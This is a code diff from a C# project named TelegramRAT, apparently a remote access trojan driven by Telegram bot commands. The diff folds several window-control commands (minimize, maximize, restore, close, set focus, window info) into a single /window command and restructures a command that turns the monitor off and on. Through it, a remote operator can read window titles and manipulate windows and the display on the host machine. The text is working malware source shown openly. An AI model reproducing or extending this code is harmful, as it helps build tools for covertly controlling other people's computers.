@@ -15,12 +15,7 @@ using WindowsInput;
 using System.Reflection;
 using System.Text;
 using NAudio.Wave;
-using IronPython;
-using IronPython.Compiler;
 using IronPython.Hosting;
-using IronPython.Runtime;
-using Microsoft.Scripting;
-using Microsoft.Scripting.Interpreter;
 using Microsoft.Scripting.Hosting;
 using Microsoft.Win32;
 
@@ -894,14 +889,19 @@ namespace TelegramRAT
                 }
             });
 
-            //MINIMIZE WINDOW
+            //WINDOW MEGA COMMAND
             CommandsList.Add(new BotCommand
             {
-                Command = "/minimize",
+                Command = "/window",
                 MayHaveNoArgs = false,
                 IgnoreCountArgs = true,
-                Description = "Minimize window by title.",
-                Example = "/minimize Calculator",
+                Description = "This command has multiple usage. After usage type title or pointer(type 0x at the start) of window. Usage list:\n\n" +
+                "<i>info</i> - Get information about window. Shows info about top window, if no name provided\n\n" +
+                "<i>minimize</i> - Minimize window\n\n" +
+                "<i>maximize</i> - Maximize window\n\n" +
+                "<i>restore</i> - Restore size and position of window\n\n" +
+                "<i>close</i> - Close window\n\n",
+                Example = "/window close Calculator",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
@@ -909,259 +909,84 @@ namespace TelegramRAT
                         try
                         {
                             IntPtr hWnd;
-
-                            if (model.Args[0].Contains("0x"))
+                            if (model.Args[0] == "info" && model.Args.Length == 1)
                             {
-                                string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                                int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                                hWnd = new IntPtr(lol);
+                                hWnd = WinAPI.GetForegroundWindow();
+                                Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
+                                string info = "" +
+                                "Window info\n" +
+                                "\n" +
+                                $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
+                                $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
+                                $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
+                                $"Pointer: <code>0x{hWnd.ToString("X")}</code>";
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: update.Message.MessageId);
                             }
-                            else
+                            if (model.Args.Length > 1)
                             {
-                                hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                            }
-                            if (hWnd != IntPtr.Zero)
-                            {
-                                bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
-                                if (isSuccessful)
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                                else
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-
-                            }
-                            else
-                            {
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            ReportError(update, ex);
-                        }
-                    });
-                }
-            });
-
-            //MAXIMIZE WINDOW
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/maximize",
-                MayHaveNoArgs = false,
-                IgnoreCountArgs = true,
-                Description = "Maximize window by title.",
-                Example = "/maximize Calculator",
-                Execute = (model, update) =>
-                {
-                    Task.Run(() =>
-                    {
-                        IntPtr hWnd;
-
-                        if (model.Args[0].Contains("0x"))
-                        {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
-                            if (isSuccessful)
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-                        }
-                        else
-                        {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
-                        }
-                    });
-                }
-            });
-
-            //RESTORE WINDOW
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/restore",
-                MayHaveNoArgs = false,
-                IgnoreCountArgs = true,
-                Description = "Restore window by title.",
-                Example = "/restore Calculator",
-                Execute = (model, update) =>
-                {
-                    Task.Run(() =>
-                    {
-                        IntPtr hWnd;
-
-                        if (model.Args[0].Contains("0x"))
-                        {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
-                            if (isSuccessful)
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-                        }
-                        else
-                        {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
-                        }
-
-                    });
-                }
-            });
-
-            //CLOSE WINDOW
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/close",
-                MayHaveNoArgs = false,
-                IgnoreCountArgs = true,
-                Description = "Close window by title",
-                Example = "/close Calculator",
-                Execute = async (model, update) =>
-                {
-                    await Task.Run(() =>
-                    {
-                        IntPtr hWnd;
-
-                        if (model.Args[0].Contains("0x"))
-                        {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
-                            if (isSuccessful)
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-                        }
-                        else
-                        {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
-                        }
-                    });
-                }
-            });
-
-            //SET FOCUS
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/setfocus",
-                MayHaveNoArgs = false,
-                IgnoreCountArgs = true,
-                Description = "Set focus to window by title.",
-                Example = "/setfocus Calculator",
-                Execute = (model, update) =>
-                {
-                    Task.Run(() =>
-                    {
-                        IntPtr hWnd;
-
-                        if (model.Args[0].Contains("0x"))
-                        {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
-                            WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                        }
-                        else
-                        {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
-                        }
-                    });
-                }
-            });
-
-            //WINDOW INFO
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/windowinfo",
-                Description = "Information about window by name, or top window if name wasn't provided",
-                Example = "/windowinfo Calculator",
-                Execute = (model, update) =>
-                {
-                    Task.Run(() =>
-                    {
-                        try
-                        {
-                            IntPtr hWnd;
-                            if (model.Args.Length > 0)
-                            {
-                                if (model.Args[0].Contains("0x"))
+                                if (model.Args[1].Contains("0x"))
                                 {
-                                    string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                                    int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                                    hWnd = new IntPtr(lol);
-
+                                    string pointerString = string.Join(string.Empty, model.Args[1].Skip(2));
+                                    int pointer = int.Parse(pointerString, System.Globalization.NumberStyles.HexNumber);
+                                    hWnd = new IntPtr(pointer);
                                 }
                                 else
                                 {
-                                    hWnd = WinAPI.FindWindow(null, model.RawArgs);
+                                    hWnd = WinAPI.FindWindow(null, string.Join(string.Empty, model.Args.Skip(1)));
                                 }
                                 if (hWnd == IntPtr.Zero)
                                 {
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Window not found!", replyToMessageId: update.Message.MessageId);
                                     return;
                                 }
+                                switch (model.Args[0])
+                                {
+
+                                    case "info":
+                                        Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
+                                        string info = "" +
+                                        "Window info\n" +
+                                        "\n" +
+                                        $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
+                                        $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
+                                        $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
+                                        $"Pointer: <code>0x{hWnd.ToString("X")}</code>";
+                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: update.Message.MessageId);
+                                        break;
+
+                                    case "minimize":
+                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
+                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                                        break;
+
+                                    case "maximize":
+                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
+                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                                        break;
+
+                                    case "setfocus":
+                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
+                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                                        break;
+
+                                    case "restore":
+                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                                        break;
+
+                                    case "close":
+                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
+                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                                        break;
+
+
+                                    default:
+                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "No such usage for /window. Type /help window for info.", replyToMessageId: update.Message.MessageId);
+                                        return;
+                                }
+                                
                             }
-                            else
-                            {
-                                hWnd = WinAPI.GetForegroundWindow();
-                            }
-                            Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
-                            string info = "" +
-                            "Window info\n" +
-                            "\n" +
-                            $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
-                            $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
-                            $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
-                            $"Pointer: 0x{hWnd.ToString("X")}";
-
-                            //bitmap bitmap = new bitmap(windowbounds.width, windowbounds.height);
-                            //Graphics thumbnail = Graphics.FromHdc(WinAPI.GetDC(WinAPI.GetForegroundWindow()));
-
-                            //thumbnail
-                            //IntPtr hDc = thumbnail.GetHdc();
-
-                            //WinAPI.PrintWindow(hWnd, hDc, 0);
-
-                            //thumbnail.ReleaseHdc(hDc);
-
-                            //bitmap.save("window.png", imageformat.png);
-
-
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: update.Message.MessageId);
-
                         }
                         catch (Exception ex)
                         {
@@ -1715,20 +1540,23 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            if (model.Args[0] == "off")
+                            switch(model.Args[0])
                             {
-                                bool status = WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MONITORPOWER, 2);
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, status ? "Monitor turned off" : "Failed", replyToMessageId: update.Message.MessageId);
-                                return;
-                            }
-                            if (model.Args[0] == "on")
-                            {
-                                new MouseSimulator(new InputSimulator()).MoveMouseBy(0, 0);
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Monitor turned on", replyToMessageId: update.Message.MessageId);
-                                return;
+                                case "off":
+                                    bool status = WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MONITORPOWER, 2);
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, status ? "Monitor turned off" : "Failed", replyToMessageId: update.Message.MessageId);
+                                    break;
+
+                                case "on":
+                                    new MouseSimulator(new InputSimulator()).MoveMouseBy(0, 0);
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Monitor turned on", replyToMessageId: update.Message.MessageId);
+                                    break;
+
+                                default:
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Type off or on. See help - /help monitor", replyToMessageId: update.Message.MessageId); ;
+                                    break;
                             }
 
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Type off or on. See help - /help monitor", replyToMessageId: update.Message.MessageId); ;
                         }
                         catch (Exception ex)
                         {
